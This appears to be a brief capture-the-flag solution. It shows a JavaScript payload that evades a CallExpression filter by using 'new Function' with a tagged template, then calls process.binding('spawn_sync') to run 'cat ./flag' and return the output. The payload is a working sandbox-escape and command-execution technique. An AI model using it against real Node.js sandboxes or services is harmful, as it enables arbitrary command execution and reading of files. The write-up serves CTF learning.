# Payload

There are many ways to call a function without the use of a CallExpression. The below solution makes use of a NewExpression to create a new function that reads the flag file. Then, we use [tagged templates](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Template_literals#tagged_templates) to call the function.

```js
new Function('let result=process.binding("spawn_sync").spawn({file:"cat",args:["cat","./flag"],stdio:[{type:"pipe",readable:true,writable:false},{type:"pipe",readable:false,writable:true},{type:"pipe",readable:false,writable:true},],});let output=result.output[1].toString();return output;')``
```
